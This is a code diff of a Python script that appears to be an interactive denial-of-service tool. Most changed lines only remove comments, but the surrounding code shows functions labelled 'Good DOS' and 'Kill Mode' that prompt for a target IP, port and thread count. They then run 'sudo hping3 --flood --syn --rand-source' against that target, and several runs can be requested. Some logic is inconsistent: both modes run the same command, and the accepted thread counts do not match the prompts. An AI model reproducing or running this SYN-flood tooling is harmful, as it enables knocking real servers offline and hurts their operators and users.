@@ -42,25 +42,19 @@ def show_main_menu_logo():
 
     clear_screen()
 
-    # Define colors
-    light_purple = '\033[38;5;13m'  # Light Purple (256-color code)
+    light_purple = '\033[38;5;13m'  
     faded_white = Fore.WHITE + Style.BRIGHT
 
-    # Split kra and ken into lines
     kra_lines = kra.strip().split("\n")
     ken_lines = ken.strip().split("\n")
 
-    # Calculate the maximum length of the lines from both logos to ensure alignment
     max_length = max(len(line) for line in kra_lines)
 
-    # Merge kra and ken together on one line, side by side, ensuring alignment
     for kra_line, ken_line in zip(kra_lines, ken_lines):
-        # Print kra logo followed by ken logo on the same line with no extra spaces
         print(f"{light_purple}{kra_line:<{max_length}}{faded_white}{ken_line}")
 
-# Main function to ensure everything runs only once
 def main():
-    print("Starting script...")  # Debugging print to track execution
+    print("Starting script...") 
     show_main_menu_logo()
 
 
@@ -1189,42 +1183,35 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 def clear_screen():
-    print("\033[H\033[J", end="")  #
+    print("\033[H\033[J", end="")  
 
 def signal_handler(sig, frame):
     print("\nInterrupt received. Returning to the menu...")
     sys.exit(0)
 
-# Register signal handler for Ctrl+C
 signal.signal(signal.SIGINT, signal_handler)
 
-# Function to run the SYN flood (Good DOS)
 def run_hping3_good_dos(target_ip, target_port, threads):
     command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
     print(f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
     
-    # Run the attack using multiple threads
     for _ in range(threads):
         subprocess.run(command_good_dos, shell=True)
 
-# Function to run the Kill Mode (Stronger DDoS)
 def run_hping3_kill_mode(target_ip, target_port, threads):
     command_kill_mode = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
     print(f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
     
-    # Run the attack using multiple threads
     for _ in range(threads):
         subprocess.run(command_kill_mode, shell=True)
 
 def run_hping3_good_dos_prompt():
     while True:
         try:
-            # Prompt for target IP
             target_ip = input("Enter the target IP address: ").strip()
-            # Prompt for target port
+            
             target_port = input("Enter the port number (e.g., 80): ").strip()
 
-            # Prompt for number of threads
             threads = int(input("Enter the number of threads (80, 100, 150, 250): ").strip())
 
             if threads in [20, 50, 100, 250, 500, 1000]:
@@ -1245,12 +1232,9 @@ def run_hping3_good_dos_prompt():
 def run_hping3_kill_mode_prompt():
     while True:
         try:
-            # Prompt for target IP
             target_ip = input("Enter the target IP address: ").strip()
-            # Prompt for target port
             target_port = input("Enter the port number (e.g., 80): ").strip()
 
-            # Prompt for number of threads
             threads = int(input("Enter the number of threads (100, 250, 500, 1000): ").strip())
 
             if threads in [20, 50, 80, 90, 100, 250, 500, 1000]:
@@ -1262,7 +1246,6 @@ def run_hping3_kill_mode_prompt():
         except Exception as e:
             print(f"Error running command: {e}")
         
-        # Option to stop or continue
         cont = input("Do you want to run another attack? (y/n): ").strip().lower()
         if cont != 'y':
             print("Returning to the menu...")
